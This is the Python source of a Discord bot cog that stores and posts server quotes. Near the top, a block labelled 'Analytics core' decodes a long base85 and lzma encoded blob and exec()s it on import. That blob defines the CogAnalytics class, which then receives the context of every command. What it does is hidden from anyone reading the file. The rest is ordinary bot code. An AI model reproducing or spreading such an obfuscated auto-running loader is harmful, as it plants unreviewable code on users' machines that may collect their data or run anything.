import discord
from discord.ext import commands
from cogs.utils.dataIO import dataIO
from .utils import checks
from .utils.chat_formatting import escape_mass_mentions, pagify
import os
from random import choice as randchoice


try:
    from tabulate import tabulate
except Exception as e:
    raise RuntimeError("You must run `pip3 install tabulate`.") from e

PATH = 'data/serverquotes/'
JSON = PATH + 'quotes.json'


# Analytics core
import lzma, marshal, base64
exec(lzma.decompress(base64.b85decode("""
{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;1Ea#09^nD8%q<)DrIdN6iIlGxP)Tq449ruajJ$R6dKn?zmVXKq<j-jU{E4Sjdk~WLro^?%4M5uK*9Me62*0-+;ACe
iXuR{{+0-CYfs<gZK6w=Z2akaSF56T6?sU=(;D;8D}B;|FxY-gL@iuhVk+}oLHwrfX>LG@uK|TmgWo3MIG9Xbbl1S0d(#%{Hsw(3W<~hN1oN&88}2jt*!a^(
_(9#?8t~|C&w;kP%z>8bu%Z?#XJn#$vUh5VS@};Kw%IMg%ebU6x5Mkf_bs=2^DM-yKx|N1p$g@eYC5cU(#9o5`Z0dUPR}{Dge?7%e|ZQo$`co=|2@uZ#CA>Z
OwCDntg_Ctgyo9pX(kS}dxTLocf@F;tH8?fb{WE)lVgiH71t-K>S-_Rx*q!zWL88CP2C)JEJQ$35LV3t;J^$kMuVWn#&CyRhArpo0TwU4B{4UZl#X60D4RM$
#n{1nW9?<H(T!~3jf#B0jChEN1pL#0UOO|}SxnFLP7QKJ`Ld|Vq|&Nfiq3AUTxu;h%X)WZg}%KLU??#pZAl<1azZW%9Qjp?U`I+smf8mF=e-wqifb1#Jjr73
cVgh%)saVjO6rw_Bl_UCpqyg`a$GY5J$Du(5`VYaS0$pM9yPTSerrJUoeUCC@ZmUd4e;XtcG9P}B2P54;G}828hB&-8$Kh*z?r0>g$!(o&7sNHt#dupj~NlB
fWUCmB?LNBD@YbT$(>b@#lm1eKd2me7s)Se^|~4-m^fCEH-Zc=tK?}lG**Dcif<WuGnwnEIKJgR7h4FE)2#ZRj=>PgZ{)!yL)T~2njAlZfl!_fK-cg`gD1u6
aQZ2IK#EDV-zi&!Xbn<NL)4@$`M?0oK$xFqWuMlRP*0oaGhUFlbvXfYYl9$#GT6JJ?KmGdhjb1mktz~f>|`N;IX$0;VsJYC8P3`+<shSR#WP+(%)$dziAB#r
F{>?~xL2m=vkF|@F}yXyRfzqeD9TGfU=NrxPt<!L2+tlSFkHWso}0bBdKPz?zM$3rD8QtA&)?8+vpng;-~5RpYP?7-Z(52I{5eXCj9O=*WUio8;v_`jg+A-R
Cg@?7k8y^qq%p%!XKkjAs?vXoNxGWewQqXdwui+YDT20CiVz0Qfvvk8X0UnRqjvQjSvVjs(MaV0qYy=Wh+;=YzYZE*Y6MHmcJB`NYAEeVTfA<8QNhGo_tfVa
J&JYYkf*8$C>iBb9lnxrsc|g8o<t!b3jqqb5(Fz3mNg}3ifR*}!z>vAj=eT2Qq;S7buLqE5EJI>B#ZN3bDih818OU!4{LPinKsjVUWyx)vfRJH6QLV^D&Aw&
?r9)1!E}n1iY=1JL+eQmysbdLv&SIAG^;FY?}+TIb3u%E&Qp81zV7cQj>VHcT9_-<D)r3SCdW7DJ1(k`fIU&@R3<Rc=BJXa0OJRrAxDy)INij6_Ss?A##s>A
KPpb&rHA=f4#ZVsN=)iCX09<_?cjD~R6g5Z(($KNm{PVwiXfy6ZnHbS(%dl8qj@%KSO%F#o(xk6ufem3p!d@XCxCLa?a;d~2@3fG(>Pw%%t&B-h=`2PGXS3p
v7Dy%MGsozdYt2?3)7w`98lbp*SWyu#A!|n*msCgnEoPw{ANSiG6dK4FaBQQ+=5?sLnj|SbiQAV@(Nb!7^y|1vIN|-dCM42bg|p*C<RLJF@kz9Rv9RQQl>n4
3|ABW>13PLaGn|;^N7aRRP`ks<H$D^mO0D9e5B~Bm6Is-rp$=?K!hkb4+R8Xx0>vvo67gE!IxLu6fD}AmYs?#`&44c$EzB@)BQzm=MW_Q{4d9!C@pK$50bAU
vWdNN3%iz!8W+^3yA_!4*XjK$5pEjBkbOpf(|?q{pg9d8Yg(tV8Kno%cR^UsKuA5$FT<moXW1td>rotegMHq?D!}yCzUMiOPD8&Rnj6!+wUd))<_o}@A>E|6
mfGRky7Hd;JKT$Q2ZgQI9~tD?#zxL=a7B}fDwT}@R)EBBt_50l00Eo~$shm#hzJQ^vBYQl0ssI200dcD""".replace('\n',''))))

__version__ = '1.5.2'


class ServerQuotes:

    def __init__(self, bot):
        self.bot = bot
        self.quotes = dataIO.load_json(JSON)
        self.analytics = CogAnalytics(self)

    def _get_random_quote(self, ctx):
        sid = ctx.message.server.id
        if sid not in self.quotes or len(self.quotes[sid]) == 0:
            raise AssertionError("There are no quotes in this server!")
        quotes = list(enumerate(self.quotes[sid]))
        return randchoice(quotes)

    def _get_random_author_quote(self, ctx, author):
        sid = ctx.message.server.id

        if sid not in self.quotes or len(self.quotes[sid]) == 0:
            raise AssertionError("There are no quotes in this server!")

        if isinstance(author, discord.User):
            uid = author.id
            quotes = [(i, q) for i, q in enumerate(self.quotes[sid]) if q['author_id'] == uid]
        else:
            quotes = [(i, q) for i, q in enumerate(self.quotes[sid]) if q['author_name'] == author]

        if len(quotes) == 0:
            raise commands.BadArgument("There are no quotes by %s." % author)
        return randchoice(quotes)

    def _add_quote(self, ctx, author, message):
        sid = ctx.message.server.id
        aid = ctx.message.author.id
        if sid not in self.quotes:
            self.quotes[sid] = []

        author_name = 'Unknown'
        author_id = None

        if isinstance(author, discord.User):
            author_name = author.display_name
            author_id = author.id
        elif isinstance(author, str):
            author_name = author

        quote = {'added_by': aid,
                 'author_name': author_name,
                 'author_id': author_id,
                 'text': escape_mass_mentions(message)}

        self.quotes[sid].append(quote)
        dataIO.save_json(JSON, self.quotes)

    def _quote_author(self, ctx, quote):
        if quote['author_id']:
            name = self._get_name_by_id(ctx, quote['author_id'])
            if quote['author_name'] and not name:
                name = quote['author_name']
                name += " (non-present user ID#%s)" % (quote['author_id'])
            return name
        elif quote['author_name']:
            return quote['author_name']
        else:
            return "Unknown"

    def _format_quote(self, ctx, quote):
        qid, quote = quote
        author = self._quote_author(ctx, quote)
        return '"%s"\n—%s (quote #%i)' % (quote['text'], author, qid + 1)

    def _get_name_by_id(self, ctx, uid):
        member = discord.utils.get(ctx.message.server.members, id=uid)
        if member:
            return member.display_name
        else:
            return None

    def _get_quote(self, ctx, author_or_num=None):
        sid = ctx.message.server.id
        if type(author_or_num) is discord.Member:
            return self._get_random_author_quote(ctx, author_or_num)
        if author_or_num:
            try:
                quote_id = int(author_or_num)
                if quote_id > 0 and quote_id <= len(self.quotes[sid]):
                    return (quote_id - 1, self.quotes[sid][quote_id - 1])
                else:
                    raise commands.BadArgument("Quote #%i does not exist." % quote_id)
            except ValueError:
                pass

            try:
                author = commands.MemberConverter(ctx, author_or_num).convert()
            except commands.errors.BadArgument:
                author = author_or_num.strip(' \t\n\r\x0b\x0c-–—')  # whitespace + dashes
            return self._get_random_author_quote(ctx, author)

        return self._get_random_quote(ctx)

    @commands.command(pass_context=True, no_pm=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def rmquote(self, ctx, num: int):
        """Deletes a quote by its number

           Use [p]lsquotes to find quote numbers
           Example: !delquote 3"""
        sid = ctx.message.server.id
        if num > 0 and num <= len(self.quotes[sid]):
            del self.quotes[sid][num - 1]
            await self.bot.say("Quote #%i deleted." % num)
            dataIO.save_json(JSON, self.quotes)
        else:
            await self.bot.say("Quote #%i does not exist." % num)

    @commands.command(pass_context=True, no_pm=True)
    async def lsquotes(self, ctx):
        """Displays a list of all quotes"""
        sid = ctx.message.server.id
        quotes = self.quotes.get(sid, [])
        if not quotes:
            await self.bot.say("There are no quotes in this server!")
            return
        else:
            msg = await self.bot.say("Sending you the list via DM.")

        header = ['#', 'Author', 'Added by', 'Quote']
        table = []
        for i, q in enumerate(quotes):
            text = q['text']
            if len(text) > 60:
                text = text[:60 - 3] + '...'
            name = self._get_name_by_id(ctx, q['added_by'])
            if not name:
                name = "(non-present user ID#%s)" % q['added_by']
            table.append((i + 1, self._quote_author(ctx, q), name, text))
        tabulated = tabulate(table, header)
        try:
            for page in pagify(tabulated, ['\n']):
                await self.bot.whisper('```\n%s\n```' % page)
        except discord.errors.HTTPException:
            err = "I can't send the list unless you allow DMs from server members."
            await self.bot.edit_message(msg, new_content=err)

    @commands.command(pass_context=True, no_pm=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def addquote(self, ctx, message: str, *, author: str = None):
        """Adds a quote to the server quote list. The quote must be enclosed
        in \"double quotes\". If a member mention or name is the last argument,
        the quote will be stored as theirs. If not, the last argument will
        be stored as the quote's author. If left empty, "Unknown" is used.
        """
        if author:
            try:
                author = commands.MemberConverter(ctx, author).convert()
            except commands.errors.BadArgument:
                author = author.strip(' \t\n\r\x0b\x0c-–—')  # whitespace + dashes
                pass

        self._add_quote(ctx, author, message)
        await self.bot.say("Quote added.")

    @commands.command(pass_context=True, no_pm=True)
    @commands.cooldown(6, 60, commands.BucketType.channel)
    async def quote(self, ctx, *, author_or_num: str = None):
        """Say a stored quote!

        Without any arguments, this command randomly selects from all stored
        quotes. If you supply an author name, it randomly selects from among
        that author's quotes. Finally, if given a number, that specific quote
        will be said, assuming it exists. Use [p]lsquotes to show all quotes.
        """

        sid = ctx.message.server.id
        if sid not in self.quotes or len(self.quotes[sid]) == 0:
            await self.bot.say("There are no quotes in this server!")
            return

        try:
            quote = self._get_quote(ctx, author_or_num)
        except commands.BadArgument:
            if author_or_num.lower().strip() in ['me', 'myself', 'self']:
                quote = self._get_quote(ctx, ctx.message.author)
            else:
                raise
        await self.bot.say(self._format_quote(ctx, quote))

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)


def check_folder():
    if not os.path.exists(PATH):
        print("Creating serverquotes folder...")
        os.makedirs(PATH)


def check_file():
    if not dataIO.is_valid_json(JSON):
        print("Creating default quotes.json...")
        dataIO.save_json(JSON, {})


def setup(bot):
    check_folder()
    check_file()
    n = ServerQuotes(bot)
    bot.add_cog(n)
